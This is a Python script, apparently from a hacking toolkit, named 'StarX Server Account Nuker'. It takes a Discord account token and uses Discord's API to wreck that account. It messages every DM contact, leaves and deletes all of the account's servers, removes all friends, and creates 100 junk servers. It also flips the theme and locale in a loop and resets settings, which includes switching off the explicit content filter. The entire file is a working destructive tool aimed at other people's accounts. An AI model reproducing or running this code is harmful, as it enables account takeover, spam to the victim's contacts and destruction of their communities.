import os, sys, time, requests, threading, random
from colorama import Fore, Style
from itertools import cycle
from util.plugins.commun import *
def clear_console():
    os.system("cls" if os.name == "nt" else "clear")
def print_banner():
    clear_console()
    print(Fore.MAGENTA + Style.BRIGHT + "╔══════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT + "       StarX Server Account Nuker      ")
    print(Fore.MAGENTA + Style.BRIGHT + "╚══════════════════════════════════════╝")
def accnuke():
    setTitle("Account Nuker")
    print_banner()
    print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Enter account token you want to nuke")
    usertoken = str(input(f"{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Token: "))
    print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Name of the servers that will be created")
    Server_Name = str(input(f"{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Name: "))
    print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Message that will be sent to every friend")
    message_Content = str(input(f"{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Message: "))
    def CustomSeizure(token):
        print(f'{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Starting seizure mode (Switching on/off Light/dark mode)')
        t = threading.current_thread()
        while getattr(t, "do_run", True):
            modes = cycle(["light", "dark"])
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': token}, json=setting)
    def nuke(usertoken, Server_Name, message_Content):
        if threading.active_count() <= 100:
            t = threading.Thread(target=CustomSeizure, args=(usertoken,))
            t.start()
        headers = {'Authorization': usertoken}
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Sent a Message to all available friends")
        for channel in channelIds:
            try:
                requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages', headers=headers, data={"content": message_Content})
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Messaged ID: {channel['id']}")
            except Exception as e:
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers=headers).json()
        print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Left all available guilds")
        for guild in guildsIds:
            try:
                requests.delete(f'https://discord.com/api/v7/users/@me/guilds/{guild["id"]}', headers=headers)
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Left guild: {guild['name']}")
            except Exception as e:
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Deleted all available guilds")
        for guild in guildsIds:
            try:
                requests.delete(f'https://discord.com/api/v7/guilds/{guild["id"]}', headers=headers)
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Deleted guild: {guild['name']}")
            except Exception as e:
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Removed all available friends")
        for friend in friendIds:
            try:
                requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers)
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Removed friend: {friend['user']['username']}#{friend['user']['discriminator']}")
            except Exception as e:
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Created all servers")
        for i in range(100):
            try:
                payload = {'name': Server_Name, 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v7/guilds', headers=headers, json=payload)
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Created {Server_Name} #{i}")
            except Exception as e:
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        t.do_run = False
        setting = {
            'theme': "light", 'locale': "ja", 'message_display_compact': False,
            'inline_embed_media': False, 'inline_attachment_media': False,
            'gif_auto_play': False, 'render_embeds': False, 'render_reactions': False,
            'animate_emoji': False, 'convert_emoticons': False, 'enable_tts_command': False,
            'explicit_content_filter': '0', 'status': "idle"
        }
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
        user = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
        print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Succesfully nuked {user['username']}#{user['discriminator']}")
        input(f"\n{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Press ENTER to exit")
    threads = 100
    if threading.active_count() < threads:
        threading.Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
def run():
    accnuke()
if __name__ == "__main__":
    run()
